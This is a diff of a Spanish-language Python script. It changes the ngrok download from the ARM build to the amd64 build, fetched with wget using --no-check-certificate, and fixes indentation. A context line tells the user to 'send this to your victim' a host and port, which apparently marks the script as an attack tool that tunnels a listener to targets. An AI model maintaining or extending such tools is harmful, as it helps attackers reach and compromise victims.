@@ -27,7 +27,7 @@ def ip():
         os.system("clear")
         print("Espera un momento \ ")
         os.system("clear")
-        print("Esperando un momento :)")
+        print("Espera un momento :)")
         print("\n")
         cantidad = cantidad + 1
 
@@ -49,13 +49,13 @@ def ip():
         print("Envia esto a tu victima:{0}:{1}\n".format(HOST, PORT))
     if seleccion == "03" or seleccion == "3":
         print("\nespera un minuto, esto puede tardar debido a tu conexion\n")
-        os.system("wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1")
-        os.system("unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1")
-        os.system("rm -rf ngrok-stable-linux-arm.zip")
-    if os.path.exists("ngrok"):
-        os.system("chmod +x ngrok")
-        print("se ha descargado con exito!\nvuelve a entrar")
-        sys.exit()
+        os.system("wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1")
+        os.system("unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1")
+        os.system("rm -rf ngrok-stable-linux-amd64.zip")
+        if os.path.exists("ngrok"):
+            os.system("chmod +x ngrok")
+            print("se ha descargado con exito!\nvuelve a entrar")
+            sys.exit()
         
 
 
